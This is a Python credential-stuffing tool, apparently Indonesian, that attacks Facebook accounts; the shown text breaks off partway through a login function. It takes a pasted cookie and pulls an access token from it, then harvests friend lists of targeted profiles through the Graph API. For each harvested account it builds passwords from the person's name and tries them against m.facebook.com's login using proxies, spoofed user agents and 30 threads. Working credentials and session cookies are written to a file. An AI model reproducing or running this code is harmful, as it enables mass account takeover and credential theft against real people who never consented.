###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.console import Console as sol
###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
tokene = []
akunyeh = []
ugen = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ualu,ualuh = [],[]
pwpluss, pwnya = [],[]
ses = requests.Session()
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
for agenku in range(100):
	rc = random.choice
	rr = random.randint
	ugen.append(rc([f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast) (Android)"]))
print(ugen)
time.sleep(3)
###----------[ USER AGENT 2 ]----------###
for agenku in range(10000):
    rr = random.randint; rc = random.choice
    nomor = str(rc(['7.1.1','7.0','8.1.0','8.0.0','6.0','8','9','10','11','12','13','14','15']))
    a = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    b = (f"{str(rc(a))}{str(rc(a))}{str(rc(a))}{str(rr(11,99))}{str(rc(a))}")
    a = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B','OPR1']))
    b = (f"{str(rr(5000,299999))}")
    c = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020','021','022','023','024','025','026','027','028','029','030','031','032','033','034','035','036','037','039','040','041','042','043','044','045','046','047','048','049','050','051','052','053','054','055','056','057','058','059','060','061','062','063','064','065','066','067','068','069','070','071','072','073','074','075','076','077','079','080']))
    kombinasi = (f"{a}.{b}.{c}")
    OP = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
    SM = str(rc(['SM-A015M','SM-A013M','SM-A022F','SM-A025G','SM-A035M','SM-A032M','SM-A037M','SM-A045F','SM-A042F','SM-A047F','SM-A105M','SM-S102DL','SM-A107M','SM-A115AP','SM-A125U','SM-A135F','SM-A136U','SM-A145R','SM-A146U','SM-A205S','SM-A202F','SM-A207F','SM-A215U','SM-A217F','SM-A225M','SM-A226B','SM-A235M','SM-A236U','SM-A245F','SM-A305FN',
    'SM-A307GT','SM-A315F','SM-A325F','SM-A326B','SM-A336E','SM-A346B','SM-A430F','SM-A405FN','SM-E236B','SM-S367VL','SM-J400M','SM-J530F','SM-J530G','SM-J600FN','SM-J610F','SM-S767VL','SM-A202K','SM-M015G','SM-M017F','SM-M127F','SM-N950U','SM-N9300','SM-N960F','SM-9005','SM-N981B','SM-N985F','SM-N770F','SM-N970F']))
    RM = str(rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]))
    RD = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
    ua0 = f'Mozilla/5.0 (Linux; U; Android {nomor}; en-us; {OP} Build/{b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(53,119))}.0.{str(rr(2500,8000))}.{str(rr(134,299))} Mobile Safari/537.36 OppoBrowser/{str(rr(1,9))}.{str(rr(1,9))}.1'
    ua1 =f'Mozilla/5.0 (Linux; Android {str(rr(8,15))}; {SM} Build/{kombinasi}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,121))}.0.{str(rr(5000,10000))}.{str(rr(18,299))} Mobile Safari/537.3'
    ua2 =f'Mozilla/5.0 (Linux; U; Android {str(rr(9,15))}; en-us; {RM} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(53,119))}.0.{str(rr(2500,8000))}.{str(rr(134,299))} Mobile Safari/537.36 RealmeBrowser/{str(rr(1,35))}.{str(rr(1,5))}.0.{str(rr(1,8))}'
    ua4 =f'Mozilla/5.0 (Linux; U; Android {str(rr(8,15))}; zh-cn; {RD} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(10,19))}.{str(rr(1,9))}.{str(rr(100000,500000))}'
    CO = rc([ua0,ua1,ua2,ua4])
    ugen.append(CO)
	
###----------[ PEWARNA ]----------###
puti = '\x1b[1;97m'# --> WARNA-PUTIH
mer = '\x1b[1;91m' # --> WARNA-MERAH
kun = '\x1b[1;93m' # --> WARNA-KUJING
hijo = '\x1b[1;92m'# --> WARNA-HIJAU
ung = '\x1b[1;95m' # --> WARNA-UNGU
biru = '\x1b[1;94m'# --> WARNA-BIRU
xxx = '\33[m'
P = '\x1b[1;97m'
KON='\x1b[38;5;46m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'         # --> DEFAULT
m = '\x1b[1;91m'    # --> RED +
k = '\033[93m'      # --> KUNING +
h = '\x1b[1;92m'    # --> HIJAU +
hh = '\033[32m'     # --> HIJAU -
u = '\033[95m'      # --> UNGU
kk = '\033[33m'     # --> KUNING -
b = '\33[1;96m'     # --> BIRU -
p = '\x1b[0;34m'    # --> BIRU +
#----------> WARNA-RICH
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
        
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login_baz()
     
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'''{hijo}
  /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$ 
 /$$__  $$ /$$__  $$| $$__  $$| $$__  $$ /$$__  $$
| $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
| $$      | $$  | $$| $$$$$$$ | $$$$$$$/| $$$$$$$$
| $$      | $$  | $$| $$__  $$| $$__  $$| $$__  $$
| $$    $$| $$  | $$| $$  \ $$| $$  \ $$| $$  | $$
|  $$$$$$/|  $$$$$$/| $$$$$$$/| $$  | $$| $$  | $$
 \______/  \______/ |_______/ |__/  |__/|__/  |__/
{puti}''')

###----------[ CEK COKIS TOKEN ]----------###
def login_baz():
	os.system('clear')
	banner()
	print('━━'* 25)
	cok = input(f'{k}Masukkan cookie :{h} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				exit(f"Token : {took} \ncookies aktif")
	except Exception as e:exit(e)
  
#----------> BAGIAN-MENU    
def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		baz_anim(f'{mer}cookies telah kadaluarsa bro')
		waktu(4)
		login_baz()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		login_baz()
	os.system('clear')
	banner()
	print('━━'* 25)
	print(f'{xxx}┗━ 1.CRACK PUBLIK\n┗━ 2.DUMP FILE\n┗━ 3.CRACK MASSAL\n┗━ 4.HAPUS PRAWAN')
	print('━━'* 25)
	CO = input(f'┗━ 𝙿𝙸𝙻𝙸𝙷 𝚃𝙾𝙳 : ')
	print('━━'* 25)
	if CO in ['1','1']:
		idt = input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 : ')
		dump(idt,"",{"cookie":cok},token)
		atur_dulu()
	elif CO in ['2','02']:
		file_dump()
	elif CO in ['3','03']:
		nge_crack()
	elif CO in ['exit','4','logout']:
		hapus_cookie =	os.system('rm -rf .token.txt && rm -f .cok.txt')
		baz_anim(f'[•] SUKSES HAPUS PRAWAN')
		time.sleep(5)
		login_baz()

###----------[ DUMP ID PUBLIK ]----------###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r┗━ 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : {H}{len(id)}{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
	
###----------[ DUMP ID PUBLIK ]----------###
def nge_crack():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙹𝚄𝙼𝙻𝙰𝙷 𝚃𝙰𝚁𝙶𝙴𝚃 : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("┗━ 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : "+str(len(id))) 
	      atur_dulu()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
###----------[ CRACK  FILE ]----------###
def file_dump():
	mz = 0
	bzz = {}
	print('━━'* 25)
	try:baz_gtg = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print('┗━ file dump tidak ada ster ')
		print('┗━ buat file terlebih dahulu ')
		waktu(2)
		exit()
	if len(baz_gtg)==0:
		print('┗━ file dump tidak ada ster ')
		print('┗━ buat file terlebih dahulu ')
		waktu(2)
		exit()
	else:
		for file_id in baz_gtg:
			try:pen_file = open('/sdcard/DUMP-FILE/'+file_id,'r').readlines()
			except:continue
			mz+=1
			if mz<100:
				jumh = ''+str(mz)
				bzz.update({str(mz):str(file_id)})
				bzz.update({jumh:str(file_id)})
				print(f'┗━ %s. %s ({hijo} %s{xxx} )'%(jumh,file_id,len(pen_file)))
			else:
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
				print('┗━ %s. %s ({hijo} %s {xxx}) '%(mz,file_id,len(pen_file)))
		_chos_baz = input('┗━ : ')
		try:gaz_sung = bzz[_chos_baz]
		except KeyError:
			print(f'┗━ yang bener milihnya {xxx}')
			waktu(2)
			file_dump()
		try:cekz_ = open('/sdcard/DUMP-FILE/'+gaz_sung,'r').read().splitlines()
		except:
			print('┗━ filenya tidak ada ')
			waktu(2)
			exit()
		for idnyh in cekz_:
			id.append(idnyh)
		atur_duluh()
		
def atur_duluh():
	print('━━'* 25)
	print('┗━ 1. AKUN BARU')
	print('┗━ 2. AKUN ACAK')
	print('━━'* 25)
	aturidh = input(f'{xxx}┗━ : ')
	if aturidh in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturidh in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{puti}┗━ pilih yang bener')
		waktu(1)
		atur_duluh()
		exit()
		
	print('━━'* 25)
	print('┗━ enter untuk mulai crack')
	print('━━'* 25)
	metodh = input(f'')
	if metodh in ['',' ']:
		xbz.append('metodh1')
	else:
		xbz.append('metodh1')
	passwrdh()

def passwrdh():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
				if '><basari><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metodh1' in xbz:
					gas_krek.submit(metodh1,idf,pwv)
				else:
					gas_krek.submit(metodh1,idf,pwv)
		yhg = '0'
		print('━━'* 25)
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}{yhg}{xxx} ')
		print('━━'* 25)

def metodh1(idf,pwv):
	yhn = '0'
	global loop,ok,cp
	prog.update(des,description=f'\r [blue]COBRA-CAN [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{yhn}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				#open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r┗━ {hijo}{idf}|{pw}|{kuki}\n{xxx}┗━ {hijo}{ua}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(' ')
	print('━━'* 25)
	print('┗━ 1. JANDA TUA')
	print('┗━ 2. JANDA MUDA')
	print('┗━ 3. JANDA PIRANG')
	print('━━'* 25)
	aturid = input(f'┗━ 𝙿𝙸𝙻𝙸𝙷 𝚃𝙾𝙳 : ')
	if aturid in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{puti}┗━ pilih yang bener')
		waktu(1)
		atur_dulu()
		exit()
		
	print('━━'* 25)
	print('┗━ 1. REGULER')
	print('┗━ 2. MBASIC')
	print('┗━ 3. VALIDATE')
	print('━━'* 25)
	metod = input(f'┗━ 𝙿𝙸𝙻𝙸𝙷 𝚃𝙾𝙳 : ')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('metod2')
	elif metod in ['3','03']:
		baz.append('metod3')
	else:
		baz.append('metod3')
		
	print('━━'* 25)
	pwplus=input(f'┗━ Tambahkan pw manual (Y/n) {H}:{P} ')
	print('━━'* 25)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'┗━ Masukan sandi :  ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

###----------[ BAGIAN PASSWRD ]----------###
def passwrd():
	global prog,des
	print('━━'* 25)
	print(f'       {H}MAINKAN PRAWAN SETIAP 300 ID{xxx}')
	print('━━'* 25)
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'15')
						pwv.append(frs+'16')
						pwv.append(frs+'123456789')
						pwv.append(frs+'14')
						pwv.append(frs+'234')
						pwv.append(frs+'345')
						pwv.append(frs+'456')
						pwv.append(frs+'567')
						pwv.append(frs+'678')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'13')
						pwv.append(frs+'10')
						pwv.append(frs+'321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'11')
						pwv.append(frs+'12')
				if '><basari><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv)
				elif 'metod2' in baz:
					gas_krek.submit(metod2,idf,pwv)
				elif 'metod3' in baz:
					gas_krek.submit(metod3,idf,pwv)
				else:
					gas_krek.submit(metod3,idf,pwv)
		print('━━'* 25)
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print('━━'* 25)
		
###----------[ REGULAR ]----------###
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[blue]COBRA-CAN [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
